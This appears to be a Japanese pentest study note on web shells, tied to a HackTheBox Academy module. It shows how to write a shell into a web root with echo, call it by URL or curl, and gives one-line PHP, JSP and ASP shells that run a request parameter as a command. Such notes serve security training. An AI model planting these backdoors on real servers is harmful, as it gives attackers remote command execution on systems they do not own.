---
tags:
  - Offensive
---

# Web Shell

エクスプロイトを実行して、攻撃対象のマシンに侵入またはリモートコードを実行できるとき、WebサーバーにPHP等のシェルにアクセスできるコードを仕込んで、ブラウザからURLを使って対話する方法。

- コードを仕込む
WebサーバーのRootにリモートコードを実行できれば、バックドアを作れる。
```bash
echo "<コード>" > /var/www/html/shell.php
```
- シェル実行
```url
http://target:port/shell.php?cmd=<command>
```
```bash
curl http://target:port/shell.php?cmd=<command>
```
Pythonを使って擬似的に対話形式にすることもできる。

## コード

- PHP
```php
<?php system($_REQUEST["cmd"]); ?>
```
- JavaServer Pages
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```
- Active Server Pages
```asp
<% eval request("cmd") %>
```


---

## 参照

1. https://academy.hackthebox.com/module/77/section/725